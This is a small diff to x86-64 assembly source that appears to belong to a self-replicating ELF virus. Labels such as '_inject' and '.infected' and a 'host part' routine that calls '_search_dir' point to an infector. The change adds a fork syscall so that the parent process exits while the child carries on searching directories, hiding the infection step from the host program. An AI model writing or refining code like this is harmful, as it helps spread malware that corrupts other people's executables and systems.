@@ -46,6 +46,11 @@ _inject:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jne .infected
 
+	mov rax, 57; fork
+	syscall
+	cmp rax, 0x0
+	jnz _exit
+
 	; host part
 	call _search_dir
 	jmp _exit
